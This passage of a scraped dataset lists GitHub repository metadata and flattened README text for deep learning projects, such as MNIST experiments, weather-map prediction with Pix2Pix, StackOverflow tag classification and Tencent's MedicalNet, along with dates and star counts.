1 0000 Last Validate Loss some of the best models reach 0 0000 Last Train Accuracy some of best models reach 1 0000 Last Train Loss some of the best models reach 0 0000 Num epochs not extremely helpful since depending on learning rate and batch sizes epochs might be faster slower more less improvement Average epoch time depends on the machine and hyperparameters most of the times 5 12 seconds Implementation details See mnist py Open questions How come even when working with reading the data once and using the same seed for shuffling we still get different results when running the model a few times How come test accuracy is at most 0 985 while validate accuracy reaches 1 0000,2019-08-12T15:06:54Z,2019-12-09T19:54:01Z,Python,yoni2k,User,1,1,0,78,master,yoni2k,1,0,0,0,0,0,0
muxiazhixing,Bike-Sharing,n/a,Bike Sharing My first project in Udacity Deep learning Nanodegree Build a neural network from scratch to predict the number of bikeshare users in a given day,2019-08-18T07:01:58Z,2019-08-18T12:36:49Z,Jupyter Notebook,muxiazhixing,User,1,1,0,4,master,muxiazhixing,1,0,0,0,0,0,0
goktugyildirim,imageRecognition,n/a,imageRecognition In this repository there are two project folders in which you can see handwritten deep learning applications are able to solve the same image recognition problem with a perceptron and two layer artificial neural network I ll attach readme file soon DATA SET LINK X https drive google com open id 1byi3pHBRrBmWWWJRIuFVCb9KjybAs4E Y https drive google com open id 1JSbjdTbpUu3T0OEDyJiQFM0MLXk3iDN,2019-08-10T00:24:16Z,2019-08-18T10:45:33Z,Jupyter Notebook,goktugyildirim,User,1,1,0,14,master,goktugyildirim,1,0,0,0,0,0,0
mohan-mj,Predict_Price_from_Text-NLP-Tensorflow-Case_study,n/a,PredictPricefromText NLP Ensemble Tensorflow Casestudy Combined multi input ANN model for NLP If youve got a prediction task where theres a relatively direct relationship between inputs and outputs a wide model will probably suffice Wide models are models with sparse feature vectors or vectors with mostly zero values Multi layer deep networks on the other hand have been known to do well on tasks like image or speech recognition where there may be unexpected relationships between inputs and outputs If youve got a prediction task that could benefit from both of these models recommendation models or models with text inputs are good examples wide deep might be a good fit In this case I tried a wide and deep model each separately then combined them and found accuracy to be best with wide deep together The wide model is able to memorize interactions with data with a large number of features but not able to generalize these learned interactions on new data The deep model generalizes well but is unable to learn exceptions within the data The wide and deep model combines the two models and is able to generalize while learning exceptions,2019-08-18T16:00:42Z,2019-08-18T18:45:05Z,Jupyter Notebook,mohan-mj,User,1,1,2,8,master,mohan-mj,1,0,0,0,0,0,0
hadoop2014,mxnet-tensorflow-pytorch-paddle,deeplearning#mxnet#paddle#pytorch#streamlit#tensorflow,mxnet tensorflow pytorch paddle conda env create f environment yaml anaconda 4 7 0 paddlepaddleGPUcuda bashrccuda10 1export LDLIBRARYPATH usr local cuda 10 1 lib64 pycharmEnvironment VariablesLDLIBRARYPATH usr local cuda 10 1 lib64 loggingdirectory logmxnet tensorflow paddle pytorch tensorflow tensorboard logdir loggingdirectory tensorflow pytorch tensorboard logdir loggingdirectory pytorch paddlepaddle visualdl logdir loggingdirectory paddle workingdirectory tensorflowckeckpoint datadirectory webappc sstreamlit streamlit run streamlitApp py,2019-09-13T04:48:45Z,2019-12-10T01:15:50Z,Python,hadoop2014,User,1,1,0,5,master,hadoop2014,1,0,0,0,0,0,0
NathanHundley,Back-to-Python-for-Data-Basics,n/a,Back to Python for Data Basics Review of basic syntax for using Python for understanding and analyzing data Much of the material is based off syntax snippets pulled together by Chris Albon and the Deep Learning book by Ian Goodfellow Yoshua Bengio and Aaron Courville,2019-09-09T15:49:50Z,2019-09-18T14:47:42Z,Jupyter Notebook,NathanHundley,User,1,1,0,3,master,NathanHundley,1,0,0,0,0,0,0
deepak223098,Indentify_Face,n/a,,2019-08-28T03:59:26Z,2019-10-16T08:58:11Z,Python,deepak223098,User,1,1,0,4,master,deepak223098,1,0,0,0,0,0,0
raolacharya,Pet-Breeds,n/a,Pet Breeds This is a deep learning model which predicts the breed of the pet cat dog there are almost 50 breeds of cat and dog images which has been trained to recognize your breed of your pet Credits Jermey Howard fast ai MOOC GPU Platform i used Google CoLab,2019-09-12T06:54:11Z,2019-09-16T10:15:36Z,Jupyter Notebook,raolacharya,User,1,1,0,4,master,raolacharya,1,0,0,0,0,0,0
abignu,Pix2Pix_RestauraMapas_PredClima,n/a,Pix2PixRestauraMapasPredClima En este repositorio se recogen dos proyectos en los que se utiliza el modelo Pix2Pix de Deep Learning para restaurar mapas de temperaturas y para hacer predicciones en base a la temperatura que hace hoy Explicar los dos proyectos de manera separada aunque usan la misma arquitectura y el mismo dataset Antes de meternos en los dos proyectos es necesario explicar el procesamiento de datos que se hizo Obtuve 3 5 GB de datos de la NOAA https www noaa gov en los que vena recogidos datos meteorolgicos registrados por diferentes estaciones meteorolgicas en todo el mundo en registros mensuales en un perdo que abarca desde 1840 hasta hoy en da Al ser muchos datos tuve que hacer una limpieza masiva ya que haba registros erroneos algunos que no cuadraban con la fecha en la que se haba registrado etc Para el proceso de limpieza utilic C EL primer paso fue separar la variable de inters temperatura mxima esto redujo el dataset a 2 GB Luego al tener datos de muchas estaciones meteorolgicas proced a coger la latitud y longitud de cada una de estas para graficar y ver en que zona haba ms datos cada pixel es una estacin Grfico de todas las estaciones disponibles entre 1840 y 2019 world https github com abignu Pix2PixRestauraMapasPredClima blob master images world png Grfico de estaciones acotado a USA entre 1840 y 2019 usa https github com abignu Pix2PixRestauraMapasPredClima blob master images usa png Como se v USA es la que ms estaciones tiene por lo que decid restringir el dataset de las TMAX a las estaciones en USA El dataset se redujo a 1 6 GB Todo esto se hizo con C El siguiente paso fue separar las estaciones junto con su latitud y longitud por ao mes y da y la temperatura asociada a ese da Esto gener muchos registros en el dataset elevndolo a 6 GB Este dataset se lo introdujo en una base de datos para manejarlo con mayor facilidad Luego de subirlo mediante queries segu limpiando el dataset Quit ms registros incoherentes ajust las temperaturas a un rango lgico ya que haba muchas temperaturas que bien superaban la temperatura mxima record o bien eran inferiores a la mnima histrica Esto lo hice por el hecho de que a lo mejor se trat de una mala medida de ese da por lo que me restring a 52C y 18C que son los registros histricos de USA Una vez hecha toda la limpieza de datos utilizando C se indexaron slo los datos desde 1980 hasta 2019 y se mapearon los valores de la TMAX dada por una estacin a travs de un color a un mapa para poder representar el gradiente de temperaturas El resultado final es el siguiente imagen 256x256 Ejemplo de un da de verano verano https github com abignu Pix2PixRestauraMapasPredClima blob master images 19890805 003504 png raw true Ejemplo de un da de invierno invierno https github com abignu Pix2PixRestauraMapasPredClima blob master images 19891221 003642 png raw true Las lneas de colores a los costados son un cdigo de colores que representan da y ao La barra horizontal representa los das 1 a 365 y la vertical el ao Esto de alguna forma para el primer proyecto ayuda a la prediccin del da siguiente Una vez obtenido el dataset principal se construy el modelo de red neuronal a utilizar en TF 2 0 Proyecto 1 El primer proyecto consisti en utilizar el modelo Pix2Pix para predecir el clima del da de maana en base al mapa de temperaturas del da de hoy De esta forma el input era el mapa de hoy y el target el mapa de maana La motivacin principal de utilizar Pix2Pix para predecir el clima es por la curiosidad de comprobar si esta estructura de redes neuronales utilizada para transformar imgenes en imgenes puede tambin adaptarse a inferir nuevos datos a partir de los existentes Es decir constatar si el modelo puede generar una imagen real en otra real o al menos cercana a ella y no en una hipottica Ambas imgenes estn en la misma carpeta ya que la target de una iteracin es el input de la siguiente Llevan un nombre que las identifica con el siguiente formato yyyymmdd xxxxxx png dnde los ltimos seis dgitos son el nmero de imagen en el dataset Se hizo un entrenamiento con 3200 imgenes El 20 de eso se pas a testeo Los resultados fueron los siguientes https github com abignu Pix2PixRestauraMapasPredClima blob master images resultadosproyecto1 result1 jpg https github com abignu Pix2PixRestauraMapasPredClima blob master images resultadosproyecto1 result2 jpg En el repositorio se ha subido el dataset para que cada uno pueda usarlo a su gusto En el notebook correspondiente al final hay una celda ejecutable para que le cargues la imagen que quieras Debe respetar el cdigo de fechas hay que acordarse de modificar las rutas de carpetas Las conclusiones extradas de este proyecto es que gener mapas predichos bastante ajustados a la realidad Aunque consideramos que aumentando los EPOCHs y extendiendo el dataset de entrenamiento el resultado debera haber sido ms fidedigno Proyecto 2 En el segundo proyecto se le dio una vuelta de tuerca con el objetivo de hacer que el output del proyecto 1 luzca de forma ms parecida a lo que es un mapa de temperaturas mximas utilizados en meteorologa De esta forma avanzando en mejoras del proyecto se puede lograr que los climatlogos utilicen este modelo para mejorar los mapas generados a partir de sus datos Se cogieron 1000 imgenes del dataset y se les aplic una accin en photoshop en la que se retoc la imagen para dejarla lo ms aceptable posible Ejemplo 1 https github com abignu Pix2PixRestauraMapasPredClima blob master images 19800627 000178 origen png raw true https github com abignu Pix2PixRestauraMapasPredClima blob master images 19800627 000178 png raw true Ejemplo 2 https github com abignu Pix2PixRestauraMapasPredClima blob master images 19800109 000008 origen png raw true https github com abignu Pix2PixRestauraMapasPredClima blob master images 19800109 000008 png raw true Claramente el nuevo target ser la imagen mejorada En el repositorio la carpeta origen es el input y la carpeta destino el target Se entren sobre 1000 imgenes 20 testeo Los resultados fueron los siguientes https github com abignu Pix2PixRestauraMapasPredClima blob master images resultadosproyecto2 result1 jpg https github com abignu Pix2PixRestauraMapasPredClima blob master images resultadosproyecto2 result2 jpg https github com abignu Pix2PixRestauraMapasPredClima blob master images resultadosproyecto2 result3 jpg Como vemos logra recontruir la imagen de manera certera Esto sin lugar a dudas es de mucha utilidad para diferentes aplicaciones de cara a la climatologa y mejora o customizacin de mapas Aqu les dejo un gif de los outputs recreados Imgenes output https github com abignu Pix2PixRestauraMapasPredClima blob master images gifinviernoimgcorregidas gif Conclusiones Se concluye que el modelo utilizado sirve para inferir datos a partir de datos a pesar de que este modelo no fue pensado para este tipo de aplicaciones A su vez se logr mejorar y adaptar un mapa utilizando el mismo modelo para llevarlo a una representacin ms acorde con los tipos de imgenes utilizadas en meteorologa,2019-09-06T10:12:07Z,2019-10-11T18:40:05Z,Jupyter Notebook,abignu,User,1,1,2,37,master,abignu,1,0,0,0,0,0,0
101vinayak,Project-Face_Detection_and_Recognition,n/a,Project FaceDetectionandRecognition A Deep Learning Project for face detection and recognition using KNN Algo The project uses harrcascades to recognise the facial features and then store them under clusters of different persons The project includes 1 Scraping out important details from the webcam that constitute a face using Harrcascades 2 Detecting the face and taking numerous images and placing this data under a certain name tag 3 Saving these different datasets and when the recognition code is run it scans the face on the cam matches it with the dataset it resembles using KNN Algo and then predict the person on the cam alt text Facesscreenshot png,2019-08-16T11:19:26Z,2019-12-13T06:45:04Z,Python,101vinayak,User,1,1,0,9,master,101vinayak,1,0,0,0,0,0,0
bertravacca,implicit-lifted_Nets-synthetic-simulation-for-feedforward-nn,n/a,implicit liftedNets synthetic simulation for feedforward nn We make our code and simulations available for the Synthetic feedforward neural network section from our article Implicit Lifted Nets L El Ghaoui F Gu B Travacca A Askari 2019 You will need MATLAB R2019A or above with the Deep Learning Toobox installed The simulation can be found in the Live Script file fenchelyoungNNs,2019-08-10T01:09:13Z,2019-11-07T01:17:16Z,MATLAB,bertravacca,User,1,1,0,4,master,bertravacca,1,1,1,0,0,0,0
raolacharya,Kid-or-Adult,n/a,Kid or Adult This is a deep learning model where i have used image recognition to distinguish if a person is a kid or an adult i have created this model inspired by Jermey Howards fast ai MOOC the model is based on pytorch and fastai the code has all the comments which will be useful to understand the process on how the code works this might need a GPU which you can rent for around 60 cents for an hour from various providers I have used Google CoLab Cloud GPU for this experiment Rahul K R,2019-09-13T04:53:51Z,2019-09-16T10:15:41Z,Jupyter Notebook,raolacharya,User,1,1,0,13,master,raolacharya,1,0,0,0,0,0,0
doguskidik,python-cnn-hello-world,n/a,python cnn hello world The MNIST handwritten digit classification problem is a standard dataset used in computer vision and deep learning You will discover how to develop a convolutional neural network for handwritten digit classification from scratch You will know How to develop a test harness to develop a robust evaluation of a model and establish a baseline of performance for a classification task How to explore extensions to a baseline model to improve learning and model capacity How to develop a finalized model evaluate the performance of the final model and use it to make predictions on new images Model Results Model structures A157B105 F40E 4505 ABD1 03EB8E3EB6B1 png Model loss 300DFDA0 04EB 4981 9672 E581318AA9FC png Model accuracy 039C9852 349A 43AB BCAB 5A3C84643A1E png,2019-09-19T17:04:03Z,2019-10-01T16:23:19Z,Jupyter Notebook,doguskidik,User,2,1,0,7,master,doguskidik,1,0,0,0,0,0,0
kyithar,Autonomous-Domain-specific-Model-Generator,n/a,Autonomous Domain specific Model Generator Introduction The main challenging issue to utilize deep learning for various tasks such as content s popularity prediction is to efficiently choose the best suited deep learning architecture among the various types of deep learning Currently domain specific deep learning models are constructed manually by human experts where the model construction process is a time consuming and error prone process This is because the human experts need to find out the appropriate neural architectures training procedures regularization methods and hyperparameters of all of these components in order to make their networks do what they are supposed to do with sufficient performance This process has to be repeated for every application Because of this we are developing the opensource platform to autonomously search the appropriate deep learning architecture for problem specific tasks i e find the appropriate model among feedforward neural networks recurrent neural networks etc as well as autonomously do the hyperparameters optimization i e find the number of appropriate hidden layers number of neurons etc The progress of Autonomous Domain specific Model Generator We implemented the Autonomous Domain specific Model Generator ADSMG by using Tensorflow with Keras Currently ADSMG is underdevelopement and we implemented the following basic components for the ADSMG as shown in Figure 1 The implemented components are as follows 1 Data Store 2 Preprocessing Module 3 Model Architecture Dictionary Model Creation Module Temporary Model Store Model Training Module and Model store Currently the ADSMG can assess via Jupyter Notebook In the current version the Data Store is to store the open dataset from the various sources such as MovieLens dataset The preprocessing module cleans the raw data to get the trainable data for the best suited model searching and selection process The Model Architecture Dictionary keeps the general deep learning framework i e Convolutional Neural Network and rules to construct deep learning models Then the Model Creation Module generates the potential deep learning model by using various types of model searching and construction algorithms i e random search Then the Model Creation Module store all of the constructed models and the performance of the models in the Tmp Model Store Next the Model Training Module chooses the best suited model and train that model with the large dataset Finally the best suited model is stored at the Model Store for future use systemmodel https github com kyithar Autonomous Domain specific Model Generator blob master mdfigs systemmodel jpg Fig 1 Basic components of Autonomous Domain specific Model Generator Requirements Tensorflow Keras Pandas,2019-09-09T04:17:54Z,2019-09-19T01:55:03Z,Jupyter Notebook,kyithar,User,0,1,0,18,master,kyithar,1,0,0,0,0,0,0
SAIKRISHNAPULIPATI,Multiclass_Multilabel_Prediction_for_StackOverFlow,n/a,MulticlassMultilabelPredictionforStackOverFlow Data set https www kaggle com saikrishnapulipati multilable multiclass prediction for stackoverflow data Objective Given text for Questions from StackoverFlow posts predict tags associated with them This is a scaled down version of predecting only top 10 most occurring tags Programming Language Python using nltk Keras Model Architecture Deep Learning using Recurrent Neural Network RNN About Data Set Dataset has text of questions answers and thier corresponding tags from the Stack Overflow programming Q A website This is organized as three files Questions contains the title body creation date closed date if applicable score and owner ID for all non deleted Stack Overflow questions Tags contains the tags on each of these questions Answers contains the body creation date score and owner ID for each of the answers to these questions The ParentId column links back to the Questions table We don t use this file as we want to predict Tags given a question Data Pre Processing Questions File Code Stackoverflow Clean Questions ipynb Read Questions File Drop All columns except Id Title and Body Now the text in the Body column seem to have many html tags in the text We use Regular Expressions and Clean the Body column text by removing the html tags Tags File Code Stackoverflow Tags Map Model ipynb Read Tags File Identify top 10 Tags by count tagCount collections Counter list dftags Tag mostcommon 10 print tagCount javascript 124155 java 115212 c 101186 php 98808 android 90659 jquery 78542 python 64601 html 58976 c 47591 ios 47009 Manipulate the tags dataframe so that all the Tags for an ID are as a list in a row grouped by Question ID Combine the Questions and Tags Code Stackoverflow Tags Map Model ipynb Merge the Questions and Tags data frame by ID total pd merge ques top10tags on Id Our Dataset would now have only Id Title Body Tags Text Preprocessing Code Stackoverflow Tags Map Model ipynb We will use nltk preprocessing from Keras and sklearn to process the text data Tags preprocesing Use MultiLabelBinarizer from sklearn on the Class labels Tags from sklearn preprocessing import MultiLabelBinarizer multilabelbinarizer MultiLabelBinarizer multilabelbinarizer fit total Tags print multilabelbinarizer classes array android c c html ios java javascript jquery php python dtype object Title Body Preprocessing Tokenize the words Convert the tokenized words to sequences Model Building Implemented a Hybrid model in TensorFlow using Keras as high level api Architecture used is RNN In this model first we train a model using the Title data then train a model using the Body data Outputs of both are concatenated and passed thorugh the dense layers before connecting to the output layer RNN Model The model first uses GRU for the sequence data training with 2 GRU layers one for Title and other for Body RNN for Title has 1 Embedding Layer has input of Title vocabulary length 68969 1 for 0 padding and out put of 2000 embeddings for better results use full vocabulary length 1 1 Gated recurrent unit GRU layer 1 dense output layer of shape 10 No of classes tags we are trying to predict Title Only titleinput Input name titleinput shape maxlent titleEmbed Embedding vocablent 1 2000 inputlength maxlent maskzero True name titleEmbed titleinput gruoutt GRU 300 titleEmbed auxiliary output to tune GRU weights smoothly auxiliaryoutput Dense 10 activation sigmoid name auxoutput gruoutt RNN for Body has 1 Embedding Layer has input of Title vocabulary length 1292018 1 for 0 padding and out put of 170 embeddings for better results use full vocabulary length 1 1 Gated recurrent unit GRU layer Body Only bodyinput Input name bodyinput shape maxlenb bodyEmbed Embedding vocablenb 1 170 inputlength maxlenb maskzero True name bodyEmbed bodyinput gruoutb GRU 200 bodyEmbed Combine the 2 GRU outputs com concatenate gruoutt gruoutb The fully connected network has 2 Dense Layers 1 Dropout layer 1 BatchNormalization layer 1 Dense Output layer now the combined data is being fed to dense layers dense1 Dense 400 activation relu com dp1 Dropout 0 5 dense1 bn BatchNormalization dp1 dense2 Dense 150 activation relu bn mainoutput Dense 10 activation sigmoid name mainoutput dense2 Model Compilattion with optimizer adam loss categoricalcrossentropy metrics accuracy Model Performance Review Classification Report to check Precision Recall and F1 Score The Model seem to performing good enough with score of 84 Increase in the Embedding GRU and dense layers would help in getting better results Random Validation on Test Data Save the Model Weights Saving the model for transfer learning or model execution later model save stackoverflowtags h5,2019-08-10T06:26:59Z,2019-11-10T15:27:10Z,Jupyter Notebook,SAIKRISHNAPULIPATI,User,1,1,0,11,master,SAIKRISHNAPULIPATI,1,0,0,0,0,0,0
sachin099,Defect-detection-of-concrete-structures-using-OpenCV-,n/a,Defect detection of concrete structures using OpenCV This is a dummy model of how I want to create this application using Deep learning algorithms Ignore the stitching of images process of which the dummy model is being developed in case the images are taken through drones Ignore the alignment of images and size in GUI template Main application would contain real time acquisition of images,2019-09-06T17:03:07Z,2019-09-09T16:45:31Z,Python,sachin099,User,1,1,0,2,master,sachin099,1,0,0,0,0,0,0
anlethie,imagedenoise,n/a,Low light photography is always challenging because of noise Usually cameras will take photos with high ISO sensitivity to compensate low brightness but at the same time amplify noise signal Photographers can also keep ISO low by increasing exposure time or aperture however result photos can be blur due to motion or depth of field Therefore many post processing methods have been developed to restore original quality of noised imaging and this has been an active area of research for years In recent years researchers in convolution neural network and deep learning have proposed many successful deep learning methods to denoise photos Our project aims to explore denoising problem and propose a pipeline based on materials presented in CS 175 project course at UCI Using presented dataset our network learns and processes directly on RGB images with real life noise and produce restored images We evaluate and compare our method to BM3D 4 method,2019-09-09T04:20:48Z,2019-11-06T15:55:22Z,HTML,anlethie,User,1,1,0,0,master,,0,0,0,0,0,0,0
khaledalam,music-impression-indicator,n/a,Music Impression Indicator Machine Learning based on a deep convolutional neural network that predicts if a user will like a new song or not It classifies user favorite songs tracking audio pitch and extract some features as min max avg signal frequency Hz based on confidence rate WPM soon Based on the classification it determines likenesses supports all formats that FFMPEG supports using Python TensorFlow CREPE Multi threading,2019-08-20T09:00:43Z,2019-10-21T02:07:52Z,Python,khaledalam,User,1,1,1,5,master,khaledalam,1,0,0,0,0,0,0
iamoneart,Energy-use-Prediction-in-Residential-Buildings-Using-LSTM,n/a,Energy use Prediction in Residential Buildings Using LSTM In this project I developed a mullitvariate time series deep learning model LSTM for prediction of energy use kWh in residential buildings The dataset used for this experiement is a daily dataset collected for two different house IDs i e 624 and 1103 for the year 2015 Each house ID has 365 datapoints with the following feature variables id timestamp actualenergyuse kWh avgtempc celcius We evaluated the LSTM model by computing the test error RMSE and the coefficient of variation of RMSE and the following results were obtained for both house IDs house id 624 Test RMSE 8 83 CV RMSE 1 54 house id 1103 Test RMSE 4 49 CV RMSE 0 93 The results show that the lstm model has a high accuracy,2019-09-07T22:47:03Z,2019-09-08T01:11:58Z,n/a,iamoneart,User,1,1,0,2,master,iamoneart,1,0,0,0,0,0,0
caldenrodrigues,Traffic-Signal-Duration-Control,n/a,Traffic Signal Duration Control Development of Traffic Signal Duration Control using Deep Learning is the title of our project Our system will monitor a traffic junction It will collect the video data and send it to the cloud It will then detect the number of vehicles the direction of the vehicle and the type of vehicle By applying an algorithm on the data received it will suggest the most ideal timing to switch between Green to Red or Vice Versa in real time This system will thereby reduce the traffic flow in real time Our system will also make prediction based on previous data of congestion It will take data from the previous week to make sure frequently happening congestions are avoided Our system will also find patterns and will predict if a congestion can occur by using previously available data of traffic hence suggesting the most ideal timing to switch between Green to Red or Vice Versa in real time It will also predict the traffic signal duration based on the information gained from the peer signals hence creating a massive grid which is controlled by central unit Each signal can inform the adjacent signal about the outgoing traffic from its area This can help the adjacent signals to take appropriate measures to avoid congestion hence reducing traffic flow and creating an optimal go green time for a user,2019-09-01T05:33:21Z,2019-11-20T08:45:14Z,Python,caldenrodrigues,User,1,1,0,6,master,caldenrodrigues,1,0,0,0,0,0,0
NLP-LOVE,ML-NLP,deep-learning#machine-learning#nlp,NLP NLPQQ541954936 12NLPQQ2207576902 GitHub QQ 1 Liner Regression https github com NLP LOVE ML NLP blob master Machine 20Learning Liner 20Regression 1 Liner 20Regression md mantchs https github com NLP LOVE 448966528 2 Logistics Regression https github com NLP LOVE ML NLP blob master Machine 20Learning 2 Logistics 20Regression 2 Logistics 20Regression md mantchs https github com NLP LOVE 448966528 3 Desision Tree https github com NLP LOVE ML NLP blob master Machine 20Learning 3 Desition 20Tree Desition 20Tree md mantchs https github com NLP LOVE 448966528 3 1 Random Forest https github com NLP LOVE ML NLP blob master Machine 20Learning 3 1 20Random 20Forest 3 1 20Random 20Forest md mantchs https github com NLP LOVE 448966528 3 2 GBDT https github com NLP LOVE ML NLP blob master Machine 20Learning 3 2 20GBDT 3 2 20GBDT md mantchs https github com NLP LOVE 448966528 3 3 XGBoost https github com NLP LOVE ML NLP blob master Machine 20Learning 3 3 20XGBoost 3 3 20XGBoost md mantchs https github com NLP LOVE 448966528 3 4 LightGBM https github com NLP LOVE ML NLP blob master Machine 20Learning 3 4 20LightGBM 3 4 20LightGBM md mantchs https github com NLP LOVE 448966528 4 SVM https github com NLP LOVE ML NLP blob master Machine 20Learning 4 20SVM 4 20SVM md mantchs https github com NLP LOVE 448966528 5 Probabilistic Graphical Model 5 1 Bayesian Network https github com NLP LOVE ML NLP blob master Machine 20Learning 5 1 20Bayes 20Network 5 1 20Bayes 20Network md mantchs https github com NLP LOVE 448966528 5 2 Markov https github com NLP LOVE ML NLP blob master Machine 20Learning 5 2 20Markov 5 2 20Markov md mantchs https github com NLP LOVE 448966528 5 3 Topic Model https github com NLP LOVE ML NLP tree master Machine 20Learning 5 3 20Topic 20Model mantchs https github com NLP LOVE 448966528 6 EM https github com NLP LOVE ML NLP tree master Machine 20Learning 6 20EM mantchs https github com NLP LOVE 448966528 7 Clustering https github com NLP LOVE ML NLP tree master Machine 20Learning 7 20Clustering mantchs https github com NLP LOVE 448966528 8 ML https github com NLP LOVE ML NLP tree master Machine 20Learning 8 20ML E7 89 B9 E5 BE 81 E5 B7 A5 E7 A8 8B E5 92 8C E4 BC 98 E5 8C 96 E6 96 B9 E6 B3 95 mantchs https github com NLP LOVE 448966528 9 K KNN https github com NLP LOVE ML NLP tree master Machine 20Learning 9 20KNN mantchs https github com NLP LOVE 448966528 10 Neural Network https github com NLP LOVE ML NLP tree master Deep 20Learning 10 20Neural 20Network mantchs https github com NLP LOVE 448966528 11 CNN https github com NLP LOVE ML NLP tree master Deep 20Learning 11 20CNN mantchs https github com NLP LOVE 448966528 12 RNN https github com NLP LOVE ML NLP tree master Deep 20Learning 12 20RNN mantchs https github com NLP LOVE 448966528 12 1 GRU https github com NLP LOVE ML NLP tree master Deep 20Learning 12 1 20GRU mantchs https github com NLP LOVE 448966528 12 2 LSTM https github com NLP LOVE ML NLP tree master Deep 20Learning 12 2 20LSTM mantchs https github com NLP LOVE 448966528 13 Transfer https github com NLP LOVE ML NLP tree master Deep 20Learning 13 20Transfer 20Learning mantchs https github com NLP LOVE 448966528 14 Reinforcement https github com NLP LOVE ML NLP tree master Deep 20Learning 14 20Reinforcement 20Learning mantchs https github com NLP LOVE 448966528 15 https github com NLP LOVE ML NLP tree master Deep 20Learning 15 20DL 20Optimizer mantchs https github com NLP LOVE 448966528 NLP 16 NLP https github com NLP LOVE ML NLP tree master NLP 16 20NLP mantchs https github com NLP LOVE 448966528 NLP 16 1 Word2Vec https github com NLP LOVE ML NLP tree master NLP 16 1 20Word 20Embedding mantchs https github com NLP LOVE 448966528 NLP 16 2 fastText https github com NLP LOVE ML NLP tree master NLP 16 2 20fastText mantchs https github com NLP LOVE 448966528 NLP 16 3 GloVe https github com NLP LOVE ML NLP tree master NLP 16 3 20GloVe mantchs https github com NLP LOVE 448966528 NLP 16 4 textRNN textCNN https github com NLP LOVE ML NLP tree master NLP 16 4 20textRNN 20 26 20textCNN mantchs https github com NLP LOVE 448966528 NLP 16 5 seq2seq https github com NLP LOVE ML NLP tree master NLP 16 5 20seq2seq mantchs https github com NLP LOVE 448966528 NLP 16 6 Attention Mechanism https github com NLP LOVE ML NLP tree master NLP 16 6 20Attention mantchs https github com NLP LOVE 448966528 NLP 16 7 Transformer https github com NLP LOVE ML NLP tree master NLP 16 7 20Transformer mantchs https github com NLP LOVE 448966528 NLP 16 8 BERT https github com NLP LOVE ML NLP tree master NLP 16 8 20BERT mantchs https github com NLP LOVE 448966528 NLP 16 9 XLNet https github com NLP LOVE ML NLP tree master NLP 16 9 20XLNet mantchs https github com NLP LOVE 448966528 17 Recommendation System https github com NLP LOVE ML NLP tree master Project 17 20Recommendation 20System mantchs https github com NLP LOVE 448966528 18 Intelligent Customer Service https github com NLP LOVE ML NLP tree master Project 18 20Intelligent 20Customer 20Service mantchs https github com NLP LOVE 448966528 19 Knowledge Graph 20 NLPQQ2207576902,2019-07-05T12:49:53Z,2019-12-15T03:44:40Z,Jupyter Notebook,NLP-LOVE,User,165,3073,910,301,master,NLP-LOVE#TolicWang,2,0,0,3,3,1,2
amusi,Deep-Learning-Interview-Book,computer-vision#deep-learning#interview#machine-learning#natural-language-processing#recommendation-system#slam,Deep Learning Interview Book smiley docs md 1234 docs md mortarboard docs md closedbook docs md greenbook docs md eyes docs md camera docs md mahjong docs md surfer SLAM docs SLAM md bustsinsilhouette docs md barchart docs md snake C C Python docs md fireworks docs md pencil2 docs md bulb docs md mega Linux docs md docs imgs DLIB Mindmap png,2019-06-24T15:06:11Z,2019-12-15T04:02:14Z,n/a,amusi,User,76,909,262,55,master,amusi,1,0,0,0,2,0,1
Tencent,MedicalNet,n/a,MedicalNet This repository contains a Pytorch implementation of Med3D Transfer Learning for 3D Medical Image Analysis https arxiv org abs 1904 00625 Many studies have shown that the performance on deep learning is significantly affected by volume of training data The MedicalNet project aggregated the dataset with diverse modalities target organs and pathologies to to build relatively large datasets Based on this dataset a series of 3D ResNet pre trained models and corresponding transfer learning training code are provided License MedicalNet is released under the MIT License refer to the LICENSE file for detailso Citing MedicalNet If you use this code or pre trained models please cite the following articlechen2019med3d title Med3D Transfer Learning for 3D Medical Image Analysis author Chen Sihong and Ma Kai and Zheng Yefeng journal arXiv preprint arXiv 1904 00625 year 2019 Update 2019 07 30 We uploaded 4 pre trained models based on more datasets 23 datasets Model name parameters settings resnet1023dataset pth model resnet modeldepth 10 resnetshortcut B resnet1823dataset pth model resnet modeldepth 18 resnetshortcut A resnet3423dataset pth model resnet modeldepth 34 resnetshortcut A resnet5023dataset pth model resnet modeldepth 50 resnetshortcut B We transferred the above pre trained models to the multi class segmentation task left lung right lung and background on Visceral dataset The results are as follows Network Pretrain LungSeg Dice 3D ResNet10 Train from scratch 69 31 MedicalNet 96 56 3D ResNet18 Train from scratch 70 89 MedicalNet 94 68 3D ResNet34 Train from scratch 75 25 MedicalNet 94 14 3D ResNet50 Train from scratch 52 94 MedicalNet 89 25 Contents 1 Requirements Requirements 2 Installation Installation 3 Demo Demo 4 Experiments Experiments 5 TODO TODO 6 Acknowledgement Acknowledgement Requirements Python 3 7 0 PyTorch 0 4 1 CUDA Version 9 0 CUDNN 7 0 5 Installation Install Python 3 7 0 pip install r requirements txt Demo Structure of data directories MedicalNet is used to transfer the pre trained model to other datasets here the MRBrainS18 dataset is used as an example MedicalNet datasets Data preprocessing module brains18 pyMRBrainS18 data preprocessing script models Model construction module resnet py3D ResNet network build script utils tools logger pyLogging script toydata For CI test data Data storage module MRBrainS18 MRBrainS18 dataset images source image named with patient ID labels mask named with patient ID train txt training data lists val txt validation data lists pretrain Pre trained models storage module model py Network processing script setting py Parameter setting script train py MRBrainS18 training demo script test py MRBrainS18 testing demo script requirement txt Dependent library list README md Network structure parameter settings Model name parameters settings resnet10 pth model resnet modeldepth 10 resnetshortcut B resnet18 pth model resnet modeldepth 18 resnetshortcut A resnet34 pth model resnet modeldepth 34 resnetshortcut A resnet50 pth model resnet modeldepth 50 resnetshortcut B resnet101 pth model resnet modeldepth 101 resnetshortcut B resnet152 pth model resnet modeldepth 152 resnetshortcut B resnet200 pth model resnet modeldepth 200 resnetshortcut B After successfully completing basic installation you ll be ready to run the demo 1 Clone the MedicalNet repository git clone https github com Tencent MedicalNet 2 Download data pre trained models Google Drive https drive google com file d 1399AsrYpQDi1vq6ciKRQkfknLsQQyigM view usp sharing or Tencent Weiyun https share weiyun com 55sZyIx Unzip and move files mv MedicalNetpytorchfiles zip MedicalNet cd MedicalNet unzip MedicalNetpytorchfiles zip 3 Run the training code e g 3D ResNet 50 python train py gpuid 0 1 multi gpu training on gpu 0 1 or python train py gpuid 0 single gpu training on gpu 0 4 Run the testing code e g 3D ResNet 50 python test py gpuid 0 resumepath trails models resnet50epoch110batch0 pth tar imglist data val txt Experiments Computational Cost GPUNVIDIA Tesla P40 Network Paramerers M Running time s 3D ResNet10 14 36 0 18 3D 